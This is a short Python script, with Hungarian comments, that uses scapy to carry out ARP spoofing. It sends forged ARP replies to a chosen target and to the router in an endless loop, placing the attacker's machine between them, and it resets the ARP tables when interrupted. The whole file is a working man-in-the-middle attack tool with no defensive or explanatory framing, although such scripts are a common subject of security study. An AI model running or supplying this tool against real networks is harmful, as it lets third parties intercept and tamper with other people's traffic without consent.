import argparse
import time
import scapy.all as scapy


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="target IP")
    parser.add_argument("-s", "--source", dest="source", help="source IP (router)")
    option = parser.parse_args()
    if not option.target:
        parser.error('[-] Add meg a cél gép és a router IP címét. Használd a --help parancsot több infóért.')
    return option


def get_mac(ip):
    # az ip cím alapján visszaadja a hozz átartozó MAC addresst
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    # visszaállítja a cél és forrás ip-ket alaphelyzetbe
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)  # a count argumentum azt jelenti,
                                                # hogy 4x küldjük el a csomagot, hogy biztos legyen


argument = get_arguments()
target = argument.target
source = argument.source
sent_packets_count = 0

while True:
    try:
        spoof(target, source)
        spoof(source, target)
        sent_packets_count += 2
        print(f"\r[+] Packet sent: {sent_packets_count}", end="")
        time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-]  Detected CTRL + C...Resetting ARP tables.")
        restore(target, source)
        break
